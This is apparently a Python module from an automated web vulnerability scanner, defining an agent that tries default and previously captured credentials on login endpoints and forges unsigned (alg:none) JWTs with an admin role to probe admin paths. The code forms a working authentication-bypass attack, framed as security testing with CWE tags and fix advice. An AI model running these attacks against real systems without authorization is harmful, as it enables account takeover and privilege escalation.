"""DeepAuthAgent — Oracle-guided Auth Bypass, JWT attacks, session fixation."""
import base64
import json as _json
import re
from backend.deepagents.base_deep_agent import BaseDeepAgent
from backend.backend.models.scan import ScanContext, Vuln
from backend.backend.models.agent_result import AgentResult
from backend.deepagents.oracle_attack import HttpRequest
from backend.deepagents.payloads.auth import DEFAULT_CREDS, JWT_WEAK_SECRETS, AUTH_SUCCESS_SIGS, JWT_ALG_NONE_HEADER

class DeepAuthAgent(BaseDeepAgent):
    """
    Oracle-guided Auth testing agent.
    Covers:
    - Default credentials brute force
    - JWT algorithm confusion (alg:none)
    - JWT weak-secret cracking (HMAC)
    - Broken object-level auth (IDOR via auth chain)
    - Session fixation detection
    """
    PRIMARY_VULN_CLASS = "Authentication Bypass / Privilege Escalation"

    async def run(self, context: ScanContext) -> AgentResult:
        if not self.asi.endpoints:
            return AgentResult(agent=self.__class__.__name__, vulns=[], context=context)

        # Use confirmed creds from AttackGraph (chained from SQLi/etc.)
        if self.graph.confirmed_creds:
            self.console.print(
                f"[cyan]DeepAuthAgent[/cyan] has {len(self.graph.confirmed_creds)} "
                f"chained credentials — attempting lateral movement..."
            )

        # Pre-flight checks
        await self._try_default_creds(context)
        await self._try_jwt_attacks(context)

        # Oracle adaptive loop for deeper auth testing
        return await super().run(context)

    async def _try_default_creds(self, context: ScanContext) -> None:
        """Try default creds against discovered login endpoints."""
        # Collect all chained + default creds
        all_creds = [(u, p, src) for u, p, src in self.graph.confirmed_creds]
        all_creds += [(u, p, "default") for u, p in DEFAULT_CREDS]

        login_paths = [
            path for path in self.asi.endpoints
            if any(kw in path.lower() for kw in ("login", "signin", "auth", "token", "session"))
        ]
        if not login_paths:
            login_paths = ["/api/login", "/login", "/auth"]

        for path in login_paths[:3]:
            for username, password, src in all_creds[:10]:
                req = HttpRequest(
                    method="POST",
                    path=path,
                    body=_json.dumps({"username": username, "password": password}),
                    headers={"Content-Type": "application/json"},
                    payload=f"{username}:{password}",
                )
                status, body, elapsed, headers = await self._http_probe(req)
                self.asi.ingest_response(path, "POST", req.body, status, body, headers)
                lower = body.lower()
                success = any(k in lower for k in AUTH_SUCCESS_SIGS) or status == 200 and "token" in lower
                if success:
                    self.console.print(
                        f"[red][DeepAuth] Default creds work: {username}:{password} on {path}[/red]"
                    )
                    self.vulns.append(Vuln(
                        name="[DYNAMIC] Default / Weak Credentials",
                        cwe="CWE-287",
                        severity="Critical",
                        endpoint=path,
                        payload=f"{username}:{password}",
                        confirmed=True,
                        evidence=f"HTTP {status} with auth success signal in response",
                        fix="Enforce strong password policy; disable default credentials.",
                    ))
                    # Store chained creds for AttackGraph
                    self.graph.confirmed_creds.append((username, password, path))
                    return

    async def _try_jwt_attacks(self, context: ScanContext) -> None:
        """Try JWT alg:none and weak-secret attacks on discovered JWTs."""
        # Look for JWT in ASI tokens_seen
        for endpoint, token in self.asi.tokens_seen.items():
            if not self._looks_like_jwt(token):
                continue
            self.console.print(f"[cyan]DeepAuthAgent[/cyan] found JWT at {endpoint}, testing attacks...")

            # ── Attack 1: alg:none ──
            try:
                parts = token.split(".")
                if len(parts) == 3:
                    # Decode payload, change role to admin
                    payload_bytes = parts[1] + "=" * (-len(parts[1]) % 4)
                    payload_data = _json.loads(base64.urlsafe_b64decode(payload_bytes))
                    payload_data["role"] = "admin"
                    payload_data["admin"] = True
                    new_payload = base64.urlsafe_b64encode(
                        _json.dumps(payload_data).encode()
                    ).rstrip(b"=").decode()
                    forged_jwt = f"{JWT_ALG_NONE_HEADER}.{new_payload}."

                    # Try the forged token on admin endpoints
                    for admin_path in ["/admin", "/api/admin", "/admin/users"]:
                        req = HttpRequest(
                            method="GET",
                            path=admin_path,
                            headers={"Authorization": f"Bearer {forged_jwt}"},
                            payload="jwt_alg_none",
                        )
                        status, body, elapsed, hdrs = await self._http_probe(req)
                        if status == 200 and len(body) > 50:
                            self.vulns.append(Vuln(
                                name="[DYNAMIC] JWT Algorithm Confusion (alg:none)",
                                cwe="CWE-287",
                                severity="Critical",
                                endpoint=admin_path,
                                payload=forged_jwt[:80],
                                confirmed=True,
                                evidence=f"Server accepted forged JWT (alg:none) — HTTP 200",
                                fix="Explicitly whitelist allowed algorithms; reject 'none'.",
                            ))
                            return
            except Exception:
                pass

    @staticmethod
    def _looks_like_jwt(token: str) -> bool:
        parts = token.split(".")
        return len(parts) == 3 and all(len(p) > 5 for p in parts)
